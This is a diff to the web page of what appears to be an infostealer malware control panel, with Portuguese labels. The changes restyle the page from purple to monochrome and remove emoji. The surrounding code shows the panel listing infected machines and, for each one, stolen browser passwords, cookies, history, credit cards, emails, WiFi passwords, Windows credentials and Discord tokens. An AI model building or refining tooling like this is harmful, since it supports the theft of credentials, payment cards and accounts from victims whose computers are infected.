@@ -195,12 +195,14 @@
         .btn-ver-dados {
             width: 100%;
             padding: 12px;
-            background: #a855f7;
+            background: transparent;
             color: #ffffff;
-            border: none;
-            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 4px;
             font-weight: 600;
-            font-size: 0.95em;
+            font-size: 0.85em;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             cursor: pointer;
             transition: all 0.3s ease;
             display: flex;
@@ -209,9 +211,9 @@
             gap: 10px;
         }
         .btn-ver-dados:hover {
-            background: #9333ea;
-            opacity: 0.9;
-            transform: translateY(-1px);
+            background: #ffffff;
+            color: #000000;
+            border-color: #ffffff;
         }
         .token-card {
             background: #0a0a0a;
@@ -377,7 +379,7 @@
             border-bottom: 1px solid rgba(255,255,255,0.05);
         }
         .modal-header h2 { margin: 0; font-size: 1.6em; font-weight: 400; letter-spacing: 2px; display: flex; align-items: center; gap: 15px; }
-        .modal-header h2 .badge { background: #a855f7; color: #fff; font-size: 0.5em; padding: 4px 10px; border-radius: 4px; font-weight: 800; letter-spacing: 2px; }
+        .modal-header h2 .badge { background: #ffffff; color: #000000; font-size: 0.5em; padding: 4px 10px; border-radius: 2px; font-weight: 800; letter-spacing: 2px; }
         .close { color: #555; font-size: 32px; cursor: pointer; transition: 0.3s; line-height: 1; }
         .close:hover { color: #fff; transform: rotate(90deg); }
         
@@ -406,13 +408,13 @@
             transition: all 0.3s ease;
         }
         .data-section:hover {
-            border-color: rgba(168, 85, 247, 0.3);
+            border-color: rgba(255, 255, 255, 0.2);
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             transform: translateY(-2px);
         }
         .data-section-header {
             padding: 15px 20px;
-            background: linear-gradient(90deg, rgba(168,85,247,0.08) 0%, transparent 100%);
+            background: linear-gradient(90deg, rgba(255,255,255,0.05) 0%, transparent 100%);
             border-bottom: 1px solid rgba(255,255,255,0.03);
             display: flex;
             justify-content: space-between;
@@ -445,11 +447,11 @@
         .data-row:last-child { margin-bottom: 0; }
         .data-key { color: #666; font-size: 0.9em; text-transform: uppercase; letter-spacing: 1px; }
         .data-val { color: #ddd; font-weight: 500; text-align: right; max-width: 70%; word-break: break-all; }
-        .data-val.accent { color: #a855f7; font-weight: 600; }
-        .data-val.success { color: #22c55e; }
-        .data-val.danger { color: #ef4444; }
-        .data-link { color: #a855f7; text-decoration: none; transition: 0.2s; }
-        .data-link:hover { color: #d8b4fe; text-decoration: underline; }
+        .data-val.accent { color: #ffffff; font-weight: 700; }
+        .data-val.success { color: #ffffff; }
+        .data-val.danger { color: #666666; text-decoration: line-through; }
+        .data-link { color: #888888; text-decoration: underline; transition: 0.2s; }
+        .data-link:hover { color: #ffffff; }
 
         .btn-print {
             background: #ffffff;
@@ -653,7 +655,7 @@
                                 <span class="info-value">${e.last_seen}</span>
                             </div>
                         </div>
-                        <button class="btn-ver-dados" onclick="showDeviceData('${e.id}')">📊 Ver Dados Completos</button>
+                        <button class="btn-ver-dados" onclick="showDeviceData('${e.id}')">VER DADOS</button>
                     </div>
                     `;
                 }).join('');
@@ -698,7 +700,7 @@
                     return `
                     <div class="data-section">
                         <div class="data-section-header">
-                            <h3 class="data-section-title">${icon} ${title}</h3>
+                            <h3 class="data-section-title">${title}</h3>
                             ${badge}
                         </div>
                         <div class="data-section-content">
@@ -715,7 +717,7 @@
                 if (sysInfoRes.ok) {
                     const sysInfo = await sysInfoRes.json();
                     if (Object.keys(sysInfo).length > 0) {
-                        html += buildHeader('Informações do Sistema', null, '🖥️') + `
+                        html += buildHeader('Informações do Sistema', null, '') + `
                             <div class="data-item">
                                 ${makeRow('Hostname', sysInfo.hostname)}
                                 ${makeRow('Usuário', sysInfo.user)}
@@ -734,7 +736,7 @@
                 if (passwordsRes.ok) {
                     const passwords = await passwordsRes.json();
                     const myPasswords = passwords.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Senhas de Navegador', myPasswords.length, '🔑') +
+                    html += buildHeader('Senhas de Navegador', myPasswords.length, '') +
                         (myPasswords.length > 0 ? myPasswords.map(d => `
                             <div class="data-item">
                                 ${makeRow('Navegador', d.browser || 'Browser')}
@@ -749,7 +751,7 @@
                 if (cookiesRes.ok) {
                     const cookies = await cookiesRes.json();
                     const myCookies = cookies.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Cookies Ativos', myCookies.length, '🍪') +
+                    html += buildHeader('Cookies Ativos', myCookies.length, '') +
                         (myCookies.length > 0 ? myCookies.map(d => {
                             let cv = d.value || '';
                             cv = cv.substring(0, 50) + (cv.length > 50 ? '...' : '');
@@ -767,7 +769,7 @@
                 if (historyRes.ok) {
                     const history = await historyRes.json();
                     const myHistory = history.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Histórico', myHistory.length, '📜') +
+                    html += buildHeader('Histórico', myHistory.length, '') +
                         (myHistory.length > 0 ? myHistory.map(d => `
                             <div class="data-item">
                                 ${makeRow('Navegador', d.browser || 'Browser')}
@@ -782,7 +784,7 @@
                 if (downloadsRes.ok) {
                     const downloads = await downloadsRes.json();
                     const myDownloads = downloads.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Downloads', myDownloads.length, '⬇️') +
+                    html += buildHeader('Downloads', myDownloads.length, '') +
                         (myDownloads.length > 0 ? myDownloads.map(d => {
                             let urlTrunc = (d.url || d.URL || 'N/A').substring(0, 60) + '...';
                             return `
@@ -798,7 +800,7 @@
                 if (cardsRes.ok) {
                     const cards = await cardsRes.json();
                     const myCards = cards.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Cartões de Crédito', myCards.length, '💳') +
+                    html += buildHeader('Cartões de Crédito', myCards.length, '') +
                         (myCards.length > 0 ? myCards.map(d => `
                             <div class="data-item">
                                 ${makeRow('Navegador', d.browser || 'Browser')}
@@ -813,7 +815,7 @@
                 if (emailsRes.ok) {
                     const emails = await emailsRes.json();
                     const myEmails = emails.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Emails do Sistema', myEmails.length, '📧') +
+                    html += buildHeader('Emails do Sistema', myEmails.length, '') +
                         (myEmails.length > 0 ? myEmails.map(d => `
                             <div class="data-item">
                                 ${makeRow('Email', d.email, 'accent')}
@@ -825,7 +827,7 @@
                 if (wifiRes.ok) {
                     const wifi = await wifiRes.json();
                     const myWifi = wifi.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Senhas WiFi', myWifi.length, '📶') +
+                    html += buildHeader('Senhas WiFi', myWifi.length, '') +
                         (myWifi.length > 0 ? myWifi.map(d => `
                             <div class="data-item">
                                 ${makeRow('SSID', d.ssid)}
@@ -840,7 +842,7 @@
                 if (sysPwdRes.ok) {
                     const sysPwds = await sysPwdRes.json();
                     const mySysPwds = sysPwds.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Credenciais do Windows', mySysPwds.length, '🔐') +
+                    html += buildHeader('Credenciais do Windows', mySysPwds.length, '') +
                         (mySysPwds.length > 0 ? mySysPwds.map(d => `
                             <div class="data-item">
                                 ${makeRow('Target', d.target || d.Target)}
@@ -855,7 +857,7 @@
                 if (tokensRes.ok) {
                     const metrics = await tokensRes.json();
                     const myTokens = metrics.filter(x => x.endpoint_id === id);
-                    html += buildHeader('Tokens do Discord', myTokens.length, '🔑') +
+                    html += buildHeader('Tokens do Discord', myTokens.length, '') +
                         (myTokens.length > 0 ? myTokens.map(m => `
                             <div class="data-item">
                                 ${makeRow('Token', m.token.substring(0, 30) + (m.token.length > 30 ? '...' : ''), 'accent')}
